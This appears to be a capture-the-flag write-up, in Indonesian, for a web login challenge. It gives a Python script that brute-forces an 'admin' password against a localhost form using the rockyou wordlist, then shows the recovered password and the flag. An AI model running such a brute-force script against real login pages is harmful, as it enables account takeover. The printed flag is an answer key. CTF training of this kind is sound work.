<h1><b>Brute and brute</h1></b>
<pre>
Login form (Username & Password)
</pre>
</b><h3>Solution</h3></b>
<p>Kita diminta login dengan bruteforce username dan password</p>

```python
import requests

url = "http://localhost/CTF/Web_warning/Web-Warning-1.php"
wordlist = open('/home/venom/CreateWordlist/rockyou.txt')
for i in wordlist:
    i = i.strip('\n')
    data = {"username":"admin",
            "password":i,
            "Submit":"Submit"}
    res = requests.post(url,data=data).text
    if "incorrect" not in res:
        print("username : admin\npassword :",i)
```
<p>Output program</p>
<pre>
username : admin
password : baby123
</pre>
<p align='justify'>Sekarang coba login dengan username dan password yang didapatkan, maka muncul pesan dan flag<b> Your success, VenomCTF{Brut3f0rce_1s_c3rtain}</b></p>
</b><h3>Flag</h3></b>
<pre>
VenomCTF{Brut3f0rce_1s_c3rtain}
</pre>
